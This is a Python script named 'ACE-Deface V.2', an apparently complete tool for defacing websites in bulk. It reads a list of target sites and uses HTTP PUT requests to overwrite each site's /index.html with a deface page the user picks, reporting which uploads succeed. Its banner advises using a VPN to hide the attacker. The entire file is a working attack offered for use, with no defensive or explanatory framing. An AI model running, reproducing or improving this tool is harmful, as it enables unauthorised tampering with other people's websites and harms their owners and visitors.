#-*- coding: utf-8 -*-
try:
   import os
   import sys
   import time
   import random
   import os.path
   import requests
   import threading
except ImportError:
   exit("install requests and try again ...(pip install requests")
os.system("git pull")
os.system("clear")
red    = "\033[31m"
blue   = "\033[34m"
bold   = "\033[1m"
reset  = "\033[0m"
green  = "\033[32m"
yellow = "\033[33m"
colors = [
    "\033[38;5;226m",
    "\033[38;5;227m",
    "\033[38;5;229m",
    "\033[38;5;230m",
    "\033[38;5;190m",
    "\033[38;5;191m",
    "\033[38;5;220m",
    "\033[38;5;221m",
    "\033[38;5;142m",
    "\033[38;5;214m",
]
color1, color2, color3, color4, color5 = random.sample(colors, 5)
banner = f"""

             ___
           /  >  フ   
          /   _  _|    Author : Disease (CPScript)
        /`   ミ_x/      Date   : 8-18-2023
     _//        |      Tools  : ACE-Deface V.2
    /  ヽ       ﾉ       Note   : Please use VPN!
    │     | | |
  ／￣\   | | |  
  | (￣ヽ＿ヽ)_)
   ＼二つ



"""+reset+red
def animate():
    text = "Uploading script to websites..."
    while True:
        for i in range(len(text)):
            print(text[:i] + "♤" + text[i+1:], end="\r")
            time.sleep(0.5)
def eagle(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)   
   return str(ipt)
def white(script, target_file="version/targets.txt"):
    op = open(script, "r").read()
    with open(target_file, "r") as target:
        target = target.readlines()
        s = requests.Session()
        print(" ")
        print(red+bold+"[♤]\033[0m \033[34mUploading to %d website..." % (len(target)), end="", flush=True)
        print(" ")

        t = threading.Thread(target=animate)
        t.daemon = True  
        t.start()                
        for web in target:
            try:
                site = web.strip()
                if site.startswith("http://") is False:
                    site = "http://" + site
                req = s.put(site + "/index.html", data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    print(red + "[" + bold + " FAILED [X]\033[0m     " + red + " ] %s/%s" % (site, script))
                else:
                    print(green + "[" + bold + " SUCCESS [✓]\033[0m" + green + " ] %s/%s" % (site, script))
            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print;
                exit()
def main(__bn__):
   print(__bn__)
   while True:
      try:
         print(yellow+'Please use cautiously!'+reset+red)
         print(' ')
         a = eagle(red+"♤ace♤\033[0m \033[34mEnter your deface script's name \033[33m[Type 'version/index.html' For the built in script!]\033[0m \033[34m> ")
         if not os.path.isfile(a):
            print(' ')
            print(red+bold+"	file '%s' not found in this folder!"%(a))
            print(" ")
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()
   white(a)
if __name__ == "__main__":
    main(banner)
